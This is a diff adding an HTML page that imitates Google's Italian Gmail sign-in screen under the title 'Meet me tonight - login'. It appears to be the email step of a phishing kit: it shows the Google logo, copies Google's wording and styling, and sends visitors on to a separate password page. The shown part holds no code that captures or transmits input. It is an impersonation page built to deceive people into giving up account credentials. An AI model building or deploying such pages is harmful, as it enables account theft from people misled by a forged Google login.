@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+
+  <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/@mdi/font@3.x/css/materialdesignicons.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Material+Icons" rel="stylesheet">
+
+  <link rel="stylesheet" href="./css/style.css">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <title>Meet me tonight - login</title>
+
+  <style>
+    #profileIdentifier{
+      font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="" id="logo">
+    <img style="width: 20%; padding: 0px;" class="center" src="./img/google-logo.png">
+  </div>
+
+  <!-- EMAIL INPUT PAGE -->
+  <div class="" style="text-align: center; padding-top: 0px; margin-top: -25px;">
+    <h1>
+      <span id="accedititolo"
+        style="font-size: 24px;
+        font-weight: 400;
+        line-height: 31.9992px;
+        font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+        color: #202124;">
+        Accedi
+      </span>
+    </h1>
+  </div>
+
+  <div class="" style="text-align: center; padding-top: 0px; margin-bottom: 20px;">
+    <span id="continuasugmail" style="font-size: 16px;
+      color: #202124;
+      font-weight: 400;
+      letter-spacing: .1px;
+      font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+      line-height: 1.5;">
+      Continua su Gmail
+    </span>
+  </div>
+
+  <!-- EMAIL TEXTBOX -->
+  <div id="emailinputsection"class="group log center">
+    <input id="email" type="text" pattern=".+@gmail.com|[0-9]{10}">
+    <span class="highlight"></span>
+
+    <label id="email-lbl">Indirizzo email o numero di telefono</label>
+  </div>
+
+
+  <div style="padding-left: 15px; padding-right: 20px;">
+    <button id="nonricordiemaillabel" type="button">Non ricordi l'indirizzo email?</button>
+    <br><br>
+  </div>
+
+
+
+
+  <!-- guest mode info -->
+  <div id="modalitaospitesection" class="" style="padding-left: 15px; padding-right: 20px; color: #5f6368;
+  font-size: 14px;
+  line-height: 1.4286;">Non si tratta del tuo computer? Utilizza la modalità ospite per accedere privatamente. <br> <button type="button" id="ulterioriinformazioni"><span style="color: #1a73e8">Ulteriori informazioni</span></button>
+
+    <br><br>
+  </div>
+
+
+  <table class="show" style=" margin-left: 12px; margin-right: 20px; width: 95%;">
+    <tr>
+      <td class="show" style="width: 75%; vertical-align: center; padding: 0">
+        <span id="creaaccountbutton" class="show">Crea un account</span>
+      </td>
+      <td class="show" style="text-align: center; width: 25%;">
+        <button id="avantibutton" class="button show" type="button"><a style="color: #fff" href="pwd-input.html">Avanti</a></button>
+      </td>
+    </tr>
+  </table>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue@2.x/dist/vue.js"></script>
+
+</body>
+</html>
